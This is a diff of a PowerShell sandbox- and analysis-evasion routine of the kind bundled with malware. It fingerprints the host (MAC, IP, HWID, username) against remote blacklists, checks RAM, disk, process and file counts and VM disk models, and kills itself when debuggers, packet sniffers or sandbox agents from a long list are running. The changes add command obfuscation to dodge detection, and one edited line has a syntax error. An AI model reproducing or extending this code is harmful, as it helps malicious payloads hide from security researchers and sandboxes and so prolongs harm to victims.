@@ -1,38 +1,37 @@
+Add-Type -AssemblyName System.Windows.Forms
+
 function ShowError {
     param([string]$errorName)
-    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
+    [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
 }
 
 function Search-Mac {
-    $pc_mac = Get-WmiObject win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
+    $pc_mac = &(gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
     $pc_macs = $pc_mac -join ","
     return $pc_macs
 }
 
 function Search-IP {
-    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
+    $pc_ip = &(gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseB
     $pc_ip = $pc_ip.Content
     return $pc_ip
 }
 
-function Wifi-Check {
+function InternetCheck {
     try {
-        $pingResult = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
-        if ($pingResult.StatusCode -ne 0) {
-            Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('WIFI CHECK FAILED !', '', 'OK', 'Error')
-            Stop-Process $pid -Force
-        }
-    }
-    catch {
-        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('WIFI CHECK FAILED !', '', 'OK', 'Error')
-        Stop-Process $pid -Force
+    $result = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
+    Write-Host "[!] Internet connection is active." -ForegroundColor Green
+    } catch {
+    ([Windows.Forms.MessageBox]::Show('INTERNET CONNECTION CHECK FAILED!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error))
+	Stop-Process $pid -Force
     }
 }
+ 
 
 function ProcessCountCheck {
-    $processes = Get-Process | Measure-Object | Select-Object -ExpandProperty Count
+    $processes = gps | Measure-Object | Select-Object -ExpandProperty Count
     if ($processes -lt 50) {
-        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('PROCESS COUNT CHECK FAILED !', '', 'OK', 'Error')
+        [System.Windows.Forms.MessageBox]::Show('PROCESS COUNT CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force
     }
 }
@@ -42,7 +41,7 @@ function RecentFileActivity {
     $file = Get-ChildItem -Path $file_Dir -Recurse
     #if number of files is less than 20
     if ($file.Count -lt 20) {
-        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
+        System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force
     }
 }
@@ -55,25 +54,26 @@ function TestDriveSize {
     }
     $driveSize = $driveSize / 1GB
     if ($driveSize -lt 50) {
-        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('DRIVE SIZE CHECK FAILED !', '', 'OK', 'Error')
+        [Windows.Forms.MessageBox]::Show('DRIVE SIZE CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force
     }
 
 }
 
 function Search-HWID {
-    $hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
+    $hwid = &(gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
     return $hwid
 }
 
 function Search-Username {
-    $pc_username = "$env:username"
-    return $pc_username
+    $getuser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $username = $getuser.Split("\")[1]
+    return $username
 }
 
 function Invoke-ANTITOTAL {
     $anti_functions = @(
-        "Wifi-Check",
+        "InternetCheck",
         "ProcessCountCheck",
         "RecentFileActivity",
         "TestDriveSize"
@@ -101,7 +101,7 @@ function Invoke-ANTITOTAL {
         $data += Invoke-Expression "$func"
     }
     foreach ($url in $urls) {
-        $blacklist = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
+        $blacklist = &(gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
         if ($null -ne $blacklist) {
             foreach ($item in $blacklist -split "`n") {
                 if ($data -contains $item) {
@@ -114,92 +114,116 @@ function Invoke-ANTITOTAL {
 }
 
 function ram_check {
-    $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-    if ($ram -lt 5) {
-        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error')
+    $ram = (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
+    if ($ram -lt 6) {
+        ([System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error'))
         Stop-Process $pid -Force  
     }
 }
 
+
 function VMPROTECT {
-    if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+	ram_check	  
+	if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
         Stop-Process $pid -Force
     } 	
-    ram_check 
     #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
         Stop-Process $pid -Force   
     }	
-    $processnames = @(
-        "autoruns",
-        "autoruns64",
-        "autorunsc",
-        "autorunsc64",
-        "die",
-        "dumpcap",
-        "etwdump",
-        "efsdump",
-        "fakenet",
-        "fiddler",
-        "filemon",
-        "hookexplorer",
-        "httpdebugger",
-        "idaq",
-        "idaq64",
-        "immunitydebugger",
-        "importrec",
-        "joeboxcontrol",
-        "joeboxserver",
-        "lordpe",
-        "ollydbg",
-        "petools",
-        "portmon",
-        "proc_analyzer",
-        "processhacker",
-        "procexp",
-        "procexp64",
-        "procmon",
-        "procmon64",
-        "pyw",
-        "qemu-ga",
-        "qga",
-        "regmon",
-        "resourcehacker",
-        "sbiesvc",
-        "sandman",
-        "scylla_x64",
-        "sniff_hit",
-        "sysanalyzer",
-        "sysinspector",
-        "sysmon",
-        "tcpdump",
-        "tcpview",
-        "tcpview64",
-        "udpdump",
-        "vboxcontrol",
-        "vboxservice",
-        "vboxtray",
-        "vgauthservice",
-        "vm3dservice",
-        "vmacthlp",
-        "vmtoolsd",
-        "vmwareuser",
-        "vt-windows-event-stream",
-        "windbg",
-        "wireshark",
-        "x32dbg",
-        "x64dbg",
-        "xenservice"
+    $processNames = @(
+        '32dbg',
+        '64dbgx',
+        'autoruns',
+        'autoruns64',
+        'autorunsc',
+        'autorunsc64',
+        'ciscodump',
+        'df5serv',
+        'die',
+        'dumpcap',
+        'efsdump',
+        'etwdump',
+        'fakenet',
+        'fiddler',
+        'filemon',
+        'hookexplorer',
+        'httpdebugger',
+        'httpdebuggerui',
+        'ida',
+        'ida64',
+        'idag',
+        'idag64',
+        'idaq',
+        'idaq64',
+        'idau',
+        'idau64',
+        'idaw',
+        'immunitydebugger',
+        'importrec',
+        'joeboxcontrol',
+        'joeboxserver',
+        'ksdumperclient',
+        'lordpe',
+        'ollydbg',
+        'pestudio',
+        'petools',
+        'portmon',
+        'prl_cc',
+        'prl_tools',
+        'proc_analyzer',
+        'processhacker',
+        'procexp',
+        'procexp64',
+        'procmon',
+        'procmon64',
+        'qemu-ga',
+        'qga',
+        'regmon',
+        'reshacker',
+        'resourcehacker',
+        'sandman',
+        'sbiesvc',
+        'scylla',
+        'scylla_x64',
+        'scylla_x86',
+        'sniff_hit',
+        'sysanalyzer',
+        'sysinspector',
+        'sysmon',
+        'tcpdump',
+        'tcpview',
+        'tcpview64',
+        'udpdump',
+        'vboxcontrol',
+        'vboxservice',
+        'vboxtray',
+        'vgauthservice',
+        'vm3dservice',
+        'vmacthlp',
+        'vmsrvc',
+        'vmtoolsd',
+        'vmusrvc',
+        'vmwaretray',
+        'vmwareuser',
+        'vt-windows-event-stream',
+        'windbg',
+        'wireshark',
+        'x32dbg',
+        'x64dbg',
+        'x96dbg',
+        'xenservice'
     )
-    $detectedProcesses = gps -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
-    if ($null -ne $detectedProcesses) {
-        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+    $foundProcesses = gps | Where-Object { $processNames -contains $_.Name.ToLower() } | Select-Object -ExpandProperty Name
+    if ($null -ne $foundProcesses) {
+        Write-Host "[!] Found the following processes:" -ForegroundColor Red
+        $foundProcesses -join "`n" | Write-Host
         Stop-Process $pid -Force
-    }
-
-    if ($null -eq $detectedProcesses) {	
-        Invoke-ANTITOTAL
+    }  
+	if ($null -eq $foundProcesses) {
+        Invoke-ANTITOTAL		
     }
 }
 VMPROTECT
+
